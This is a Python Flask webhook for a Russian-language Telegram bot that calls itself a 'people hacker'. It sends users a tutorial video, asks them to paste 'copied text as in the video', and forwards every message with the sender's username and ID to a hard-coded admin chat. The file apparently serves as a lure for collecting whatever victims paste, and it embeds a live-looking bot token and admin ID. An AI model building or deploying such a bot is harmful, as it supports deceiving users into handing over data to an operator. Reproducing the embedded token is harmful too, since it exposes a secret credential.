from flask import Flask, request
import requests
import os

app = Flask(__name__)

BOT_TOKEN = "8851655567:AAEGziVSFXpZSAMD1hSjreZhP-OBfQUjvoc"
ADMIN_CHAT_ID = "8625787020"

# ТВОЙ FILE_ID ВИДЕО (получен через getUpdates)
VIDEO_FILE_ID = "BAACAgEAAxkBAAP7akugXF318MJWQ3616dZDkwJJ4hkAAnEHAALuAmBGFLl3swomiE88BA"

# Кнопки
KEYBOARD = {
    "keyboard": [
        ["📹 Тутор", "💀 Взломать"],
        ["📩 Отправить сообщение Админу"]
    ],
    "resize_keyboard": True,
    "one_time_keyboard": False
}

WELCOME_TEXT = "Здравствуйте! Я бот Взломщик людей 😀\nСкиньте сюда текст, как из видео, и к вам зайдёт админ-помощник 🆘 в личные сообщения спустя полчаса - час. Удачи!"

@app.route('/')
def home():
    return "Bot is alive!", 200

@app.route('/webhook', methods=['POST'])
def webhook():
    data = request.get_json()
    
    if data and 'message' in data:
        chat_id = data['message']['chat']['id']
        text = data['message'].get('text', '').lower()
        username = data['message']['from'].get('username', 'anon')
        user_id = data['message']['from']['id']

        # Пересылка ВСЕХ сообщений админу
        if text:
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={
                    "chat_id": ADMIN_CHAT_ID,
                    "text": f"📩 От @{username} (ID: {user_id}):\n{text}"
                }
            )

        # === Кнопка ТУТОР ===
        if text == "📹 тутор" or text == "тутор":
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo",
                json={
                    "chat_id": chat_id,
                    "video": VIDEO_FILE_ID,
                    "caption": "📹 Вот твой видео-туториал!"
                }
            )
            # Показываем кнопки снова
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={
                    "chat_id": chat_id,
                    "text": "Выбери действие:",
                    "reply_markup": KEYBOARD
                }
            )

        # === Кнопка ВЗЛОМАТЬ ===
        elif text == "💀 взломать" or text == "взломать":
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={
                    "chat_id": chat_id,
                    "text": "Здравствуйте! Отправьте ваш скопированный текст сюда в чат!",
                    "reply_markup": KEYBOARD
                }
            )

        # === Кнопка ОТПРАВИТЬ СООБЩЕНИЕ АДМИНУ ===
        elif text == "📩 отправить сообщение админу" or text == "отправить сообщение админу":
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={
                    "chat_id": chat_id,
                    "text": "✉️ Напишите ваше сообщение сюда, и мы передадим его Администратору.",
                    "reply_markup": KEYBOARD
                }
            )

        # === ОТВЕТ АДМИНА ПОЛЬЗОВАТЕЛЮ (reply_123: текст) ===
        elif text.startswith("reply_"):
            parts = text.split(":", 1)
            if len(parts) == 2:
                target_id = parts[0].replace("reply_", "").strip()
                reply_text = parts[1].strip()
                if target_id.isdigit():
                    requests.post(
                        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                        json={
                            "chat_id": int(target_id),
                            "text": f"📨 Ответ от Админа:\n{reply_text}"
                        }
                    )
                    requests.post(
                        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                        json={
                            "chat_id": ADMIN_CHAT_ID,
                            "text": f"✅ Ответ отправлен пользователю {target_id}"
                        }
                    )

        # === /start или любое другое сообщение ===
        else:
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={
                    "chat_id": chat_id,
                    "text": WELCOME_TEXT,
                    "reply_markup": KEYBOARD
                }
            )

    return "ok", 200

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
